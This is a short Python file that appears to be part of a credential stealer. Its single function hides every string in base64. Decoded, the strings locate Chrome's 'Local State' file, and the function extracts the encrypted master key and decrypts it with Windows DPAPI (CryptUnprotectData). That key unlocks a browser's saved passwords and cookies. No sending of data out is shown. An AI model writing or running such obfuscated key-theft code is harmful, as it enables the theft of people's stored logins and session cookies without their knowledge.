from gisi.bd import *
import os
import json
import win32crypt as w


def gek():
    lsp = os.path.join(os.environ[bd("VVNFUlBST0ZJTEU=")], bd("QXBwRGF0YQ=="), bd("TG9jYWw="),
                       bd("R29vZ2xl"),
                       bd("Q2hyb21l"), bd("VXNlciBEYXRh"), bd("TG9jYWwgU3RhdGU="))
    with open(lsp, "r", encoding="utf-8") as f:
        ls = f.read()
        ls = json.loads(ls)
    k = bdd(ls[bd("b3NfY3J5cHQ=")][bd("ZW5jcnlwdGVkX2tleQ==")])
    k = k[5:]
    return w.CryptUnprotectData(k, None, None, None, 0)[1]
